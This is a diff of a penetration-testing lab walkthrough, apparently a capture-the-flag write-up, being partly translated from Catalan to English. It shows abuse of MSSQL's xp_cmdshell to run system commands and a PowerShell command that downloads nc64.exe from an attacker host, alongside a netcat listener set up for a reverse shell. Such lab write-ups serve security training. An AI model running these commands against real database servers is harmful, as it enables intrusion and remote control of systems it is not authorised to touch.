@@ -76,7 +76,7 @@ Now the server permits system commands.
 
 > Test System Commands Execution
 ```SQL
-SQL> xp_cmdshell "whoami"
+SQL> xp_cmdshell "whoami";
 ```
 
 
@@ -101,26 +101,24 @@ $ sudo nc -lvnp 443
 [-p]: Specifies source port nc should use
 
 Check the actual server directory. If the user doesn't have permission, change it.
-> Server Directory
-```sql
-SQ
-```
 
-
-
-> Saber directori del server
+> Current Server Directory
 ```sql
 SQL> xp_cmdshell "powershell -c pwd";
 ```
 
+In the current directory sql_svc does not have permission to execute things. 
 
-En aquest directori no hi ha permisos d'execucció per l'usuari sql_svc així que haurem d'utilitzar el alguna ruta del seu directori.
-Després fem la petició de la reverse shell que tenim en local.
-
-> Canvi de directori i Reverse Shell
+> Change to user directory and execute Reverse shell
 ```sql
-SQL> xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://10.10.14.123/nc64.exe -outfile nc64.exe"
+SQL> xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://IP/nc64.exe -outfile nc64.exe"
 ```
+
+
+
+
+
+---
 
 Podrem observar que el python que tenim escoltant al port 80 ha rebut una petició de GET.
 
